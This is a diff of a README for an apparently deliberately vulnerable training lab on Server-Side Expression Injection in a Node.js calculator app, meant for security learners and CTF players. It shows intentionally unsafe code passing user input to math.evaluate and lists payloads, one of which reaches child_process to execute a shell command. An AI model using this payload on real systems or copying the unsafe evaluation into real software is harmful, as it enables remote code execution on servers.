@@ -1,9 +1,42 @@
-
 # 🧠 Server-Side Expression Injection (SSEI) Vulnerable Lab
 
 Welcome to the **SSEI-Lab**, a purposely vulnerable web app built to help security professionals, CTF players, and students learn how Server-Side Expression Injection vulnerabilities work — including how they can lead to Remote Code Execution (RCE).
 
-## 🚀 About This Lab
+## 🧠 Purpose
+
+🚀 This repo provides:
+
+- A wordlist of payloads to detect and exploit SSEI.
+- A vulnerable Docker lab for hands-on practice.
+
+## What is SSEI?
+
+Server-Side Expression Injection (SSEI) is a vulnerability where user input is interpreted as a code expression on the server side. This often occurs in applications using math evaluators, template engines, or unsafe `eval()` functions.
+
+## Example vulnerable code
+
+```js
+const math = require('mathjs');
+const userInput = req.body.equation;
+const result = math.evaluate(userInput);
+res.send("Math result: " + result);
+```
+
+## Payload Examples
+
+- `1+1` → 2
+- `[].constructor.constructor("return process")()` → access Node.js process object
+- `[].constructor.constructor("return process.mainModule.require('child_process').execSync('id').toString()")()` → RCE
+
+## Tools
+
+Use with tools like:
+
+- Burp Suite Intruder
+- curl/Postman
+- ffuf, wfuzz
+
+## Running the Docker Lab
 
 This Docker-based lab contains a **Node.js web application** that evaluates user-supplied mathematical expressions — similar to many real-world calculators — but with a vulnerability: **user input is evaluated directly**.
 
